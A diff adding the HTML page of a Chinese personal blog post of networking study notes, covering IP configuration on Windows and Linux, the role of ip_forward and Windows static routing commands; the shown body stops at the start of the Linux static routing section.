@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/meow.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.20/fancybox/fancybox.css" integrity="sha256-RvRHGSuWAxZpXKV9lLDt2e+rZ+btzn48Wp4ueS3NZKs=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ndohe.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.1","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="linux&#x2F;Windows IP配置linux和windows改ip地址,Linux和Windows下IP地址设置_羊鱼鸡的博客-CSDN博客 省流版： windows IP配置  linux IP配置">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络及协议">
+<meta property="og:url" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:site_name" content="熹有长庚夜有雾">
+<meta property="og:description" content="linux&#x2F;Windows IP配置linux和windows改ip地址,Linux和Windows下IP地址设置_羊鱼鸡的博客-CSDN博客 省流版： windows IP配置  linux IP配置">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231011104332748.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/3d0439ec570ffe75fc081fb584753902.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/9c6d7d2aaf25fe01c0a3262103415408.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/v2-7fcfcfa628ba6923e4264c15a8cb6bf2_1440w.webp">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/v2-97e0a417d4f802b6466f6a0a8c3e7641_1440w.webp">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/20181203234109944.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/2018120323440996.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017113911923.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017113928601.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114342539.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114505036.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114700376.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114852436.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017115035651.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017115048774.png">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/ce49aedfc45c82ef6a6f261c82af07a4.gif">
+<meta property="og:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5OTQ2OTE2,size_16,color_FFFFFF,t_70#pic_center.png">
+<meta property="article:published_time" content="2023-10-11T02:38:06.000Z">
+<meta property="article:modified_time" content="2023-11-09T02:03:22.692Z">
+<meta property="article:author" content="Yaura Chan">
+<meta property="article:tag" content="学习计划">
+<meta property="article:tag" content="网络协议">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231011104332748.png">
+
+
+<link rel="canonical" href="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/","path":"2023/10/11/网络及协议/","title":"网络及协议"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>网络及协议 | 熹有长庚夜有雾</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?0b3fb3f66d73deb36055ee14c467f91b"></script>
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">熹有长庚夜有雾</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">东有启明，西有长庚。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">10</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-Windows-IP%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">linux&#x2F;Windows IP配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#windows-IP%E9%85%8D%E7%BD%AE"><span class="nav-number">1.1.</span> <span class="nav-text">windows IP配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-IP%E9%85%8D%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">linux IP配置</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-Windows%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">linux&#x2F;Windows路由配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ip-forward%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">2.1.</span> <span class="nav-text">ip_forward的作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ip-forward%E8%B7%9F%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E7%9A%84%E8%81%94%E7%B3%BB%E5%8F%8A%E4%BD%9C%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">ip_forward跟路由转发的联系及作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#windows%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">windows配置静态路由：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%EF%BC%9A"><span class="nav-number">2.4.</span> <span class="nav-text">Linux配置静态路由：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%80%E5%90%AFLinux%E7%B3%BB%E7%BB%9F%E7%9A%84IP%E8%BD%AC%E5%8F%91%E5%8A%9F%E8%83%BD"><span class="nav-number">2.5.</span> <span class="nav-text">开启Linux系统的IP转发功能:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E5%BC%80%E5%90%AFLinux%E7%B3%BB%E7%BB%9F%E7%9A%84IP%E8%BD%AC%E5%8F%91%E5%8A%9F%E8%83%BD"><span class="nav-number">2.6.</span> <span class="nav-text">什么时候需要开启Linux系统的IP转发功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">2.7.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%8E%92%E9%94%99%E5%91%BD%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">网络排错命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ping"><span class="nav-number">3.1.</span> <span class="nav-text">ping</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E8%BF%9E%E9%80%9A%E6%80%A7%E9%97%AE%E9%A2%98%E8%BF%98%E6%98%AF%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98"><span class="nav-number">3.1.1.</span> <span class="nav-text">判断是连通性问题还是性能问题</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%8C%85ping%E5%AF%B9%E7%AB%AF%E8%BF%9B%E8%A1%8CMTU%E4%B8%8D%E4%B8%80%E8%87%B4%E7%9A%84%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4"><span class="nav-number">3.1.2.</span> <span class="nav-text">使用大包ping对端进行MTU不一致的故障排除</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A%E8%83%BD%E5%A4%9FPing%E9%80%9AB%E5%88%99B%E4%B8%80%E5%AE%9A%E8%83%BD%E5%A4%9FPing%E9%80%9AA%EF%BC%88%E4%B8%8D%E8%80%83%E8%99%91%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%9B%A0%E7%B4%A0%EF%BC%89"><span class="nav-number">3.1.3.</span> <span class="nav-text">A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Traceroute"><span class="nav-number">3.2.</span> <span class="nav-text">Traceroute</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8Traceroute%E5%91%BD%E4%BB%A4%E5%AE%9A%E4%BD%8D%E4%B8%8D%E5%BD%93%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E7%82%B9"><span class="nav-number">3.2.1.</span> <span class="nav-text">案例一：使用Traceroute命令定位不当的网络配置点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8Traceroute%E5%91%BD%E4%BB%A4%E5%8F%91%E7%8E%B0%E8%B7%AF%E7%94%B1%E7%8E%AF%E8%B7%AF"><span class="nav-number">3.2.2.</span> <span class="nav-text">案例二：使用Traceroute命令发现路由环路</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">3.3.</span> <span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#nmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">3.3.1.</span> <span class="nav-text">nmap常用命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA-%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA"><span class="nav-number">3.3.2.</span> <span class="nav-text">实例演示-发现主机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA-%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="nav-number">3.3.3.</span> <span class="nav-text">实例演示-端口发现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA-%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E7%89%88%E6%9C%AC%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="nav-number">3.3.4.</span> <span class="nav-text">实例演示-获得服务版本详细信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA-%E7%A1%AE%E5%AE%9A%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.3.5.</span> <span class="nav-text">实例演示-确定主机操作系统</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%BA%94%E7%94%A8"><span class="nav-number">3.3.6.</span> <span class="nav-text">实例应用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#telnet"><span class="nav-number">3.4.</span> <span class="nav-text">telnet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Arp"><span class="nav-number">3.5.</span> <span class="nav-text">Arp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc"><span class="nav-number">3.6.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl"><span class="nav-number">3.7.</span> <span class="nav-text">curl</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%83%BD%E5%90%A6%E8%BF%9E%E9%80%9A%E5%A4%96%E7%BD%91%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">测试Linux服务器能否连通外网的命令：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iptables-%E5%AD%A6%E4%B9%A0"><span class="nav-number">5.</span> <span class="nav-text">iptables 学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#iptables%E7%AE%80%E4%BB%8B"><span class="nav-number">5.1.</span> <span class="nav-text">iptables简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%89%A9%E5%B1%95"><span class="nav-number">5.2.</span> <span class="nav-text">命令与扩展</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iptables%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F"><span class="nav-number">5.3.</span> <span class="nav-text">iptables防火墙的备份与还原</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#iptables-save%E5%91%BD%E4%BB%A4"><span class="nav-number">5.3.1.</span> <span class="nav-text">iptables-save命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iptables-restore%E5%91%BD%E4%BB%A4"><span class="nav-number">5.3.2.</span> <span class="nav-text">iptables-restore命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iptables-services%E5%91%BD%E4%BB%A4"><span class="nav-number">5.3.3.</span> <span class="nav-text">iptables-services命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iptables-%E5%AE%8C%E6%88%90TCP%E8%BD%AC%E5%8F%91%E5%AE%9E%E9%AA%8C"><span class="nav-number">5.4.</span> <span class="nav-text">iptables 完成TCP转发实验</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E5%92%8C-IPtables-%E9%97%B4%E7%9A%84%E4%BA%B2%E5%AF%86%E5%85%B3%E7%B3%BB"><span class="nav-number">6.</span> <span class="nav-text">Docker 容器网络和 IPtables 间的亲密关系</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#docker%E7%BD%91%E7%BB%9C%E7%B1%BB%E5%9E%8B"><span class="nav-number">6.1.</span> <span class="nav-text">docker网络类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Docker%E5%92%8Ciptables%E4%B9%8B%E9%97%B4%E5%AD%98%E5%9C%A8%E5%AF%86%E5%88%87%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="nav-number">6.2.</span> <span class="nav-text">Docker和iptables之间存在密切的关系</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ssh%E5%91%BD%E4%BB%A4%E5%B0%86%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E5%8F%91%E5%B8%83%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">7.</span> <span class="nav-text">使用ssh命令将内网端口发布到远程服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="nav-number">7.1.</span> <span class="nav-text">前期准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">7.2.</span> <span class="nav-text">命令行使用方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%86%9F%E7%BB%83%E4%BD%BF%E7%94%A8zerotier%E3%80%81frps%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AE%E7%AD%96%E7%95%A5"><span class="nav-number">8.</span> <span class="nav-text">熟练使用zerotier、frps进行内网穿透，并设置策略</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Yaura Chan"
+      src="/images/meow.jpg">
+  <p class="site-author-name" itemprop="name">Yaura Chan</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ndohe.github.io/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/meow.jpg">
+      <meta itemprop="name" content="Yaura Chan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="熹有长庚夜有雾">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="网络及协议 | 熹有长庚夜有雾">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          网络及协议
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-10-11 10:38:06" itemprop="dateCreated datePublished" datetime="2023-10-11T10:38:06+08:00">2023-10-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-11-09 10:03:22" itemprop="dateModified" datetime="2023-11-09T10:03:22+08:00">2023-11-09</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="linux-Windows-IP配置"><a href="#linux-Windows-IP配置" class="headerlink" title="linux&#x2F;Windows IP配置"></a>linux&#x2F;Windows IP配置</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_35909607/article/details/116824527#:~:text=1">linux和windows改ip地址,Linux和Windows下IP地址设置_羊鱼鸡的博客-CSDN博客</a></p>
+<p><strong>省流版</strong>：</p>
+<h4 id="windows-IP配置"><a href="#windows-IP配置" class="headerlink" title="windows IP配置"></a>windows IP配置</h4><img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231011104332748.png" class title="image-20231011104332748">
+
+<h4 id="linux-IP配置"><a href="#linux-IP配置" class="headerlink" title="linux IP配置"></a>linux IP配置</h4><span id="more"></span>
+
+<ol>
+<li>在终端中输入：vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</li>
+</ol>
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/3d0439ec570ffe75fc081fb584753902.png" class title="3d0439ec570ffe75fc081fb584753902.png">
+
+<ol start="2">
+<li>开始编辑，填写ip地址、子网掩码、网关、DNS等。其中“红框内的信息”是必须得有的。</li>
+</ol>
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/9c6d7d2aaf25fe01c0a3262103415408.png" class title="9c6d7d2aaf25fe01c0a3262103415408.png">
+
+<ol start="3">
+<li><p>编辑完后，保存退出(:w保存， ：q退出)。</p>
+</li>
+<li><p>重启网络服务。service network restart或&#x2F;etc&#x2F;init.d&#x2F;network restart。即可。</p>
+</li>
+</ol>
+<h3 id="linux-Windows路由配置"><a href="#linux-Windows路由配置" class="headerlink" title="linux&#x2F;Windows路由配置"></a>linux&#x2F;Windows路由配置</h3><h4 id="ip-forward的作用"><a href="#ip-forward的作用" class="headerlink" title="ip_forward的作用"></a>ip_forward的作用</h4><p>在Linux系统中，ip_forward用于控制IP报文的转发。当ip_forward的值为1时，Linux内核会允许IP报文转发，这通常用于实现路由和负载均衡等功能。反之，当ip_forward的值为0时，Linux内核会禁止IP报文转发，这通常用于保证网络安全。</p>
+<h4 id="ip-forward跟路由转发的联系及作用"><a href="#ip-forward跟路由转发的联系及作用" class="headerlink" title="ip_forward跟路由转发的联系及作用"></a>ip_forward跟路由转发的联系及作用</h4><p>路由转发是指在网络中，当一个数据包的目标地址与源地址不在同一个网络时，数据包从一个网络节点传送到另一个网络节点，以实现数据包的路由和转发。这个过程需要路由器或者具有路由功能的设备来进行。</p>
+<p>具体来说，ip_forward可以实现路由器的功能，利用主机上的两块网卡（网卡处于不同网段），将数据包在两块网卡之间进行传送，实现两个网络之间的访问。</p>
+<p>当一个数据包到达一个具有多个网卡的设备时，设备会根据数据包的目的IP地址和路由表来决定将数据包发送到哪个网卡上。在这个过程中，ip_forward会根据路由表对数据包进行转发。</p>
+<p>如果没有ip_forward，那么当一个数据包到达一个具有多个网卡的设备时，设备就无法决定将数据包发送到哪个网卡上，也就无法实现路由和转发功能。因此，ip_forward是实现路由和转发功能的关键。</p>
+<h4 id="windows配置静态路由："><a href="#windows配置静态路由：" class="headerlink" title="windows配置静态路由："></a>windows配置静态路由：</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010178308/article/details/80969112">windows如何添加静态路由_windows添加路由-CSDN博客</a></p>
+<p>\1. 查看所有的路由信息</p>
+<p>route print</p>
+<p>\2. 添加一条路由条目</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add -p 10.0.0.0 mask 255.0.0.0 10.10.16.1</span><br><span class="line">// -p 参数永久添加，不用 -p 为临时生效</span><br></pre></td></tr></table></figure>
+
+<p>\3. 删除路由条目</p>
+<p>route delete 157.0.0.0 MASK 255.0.0.0</p>
+<p>\4. 修改路由条目（CHANGE 只用于修改网关和&#x2F;或跃点数）</p>
+<p>route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2</p>
+<h4 id="Linux配置静态路由："><a href="#Linux配置静态路由：" class="headerlink" title="Linux配置静态路由："></a>Linux配置静态路由：</h4><p>临时的配置见参考链接</p>
+<p>CentOS（<strong>永久</strong>）</p>
+<p>推荐方式：</p>
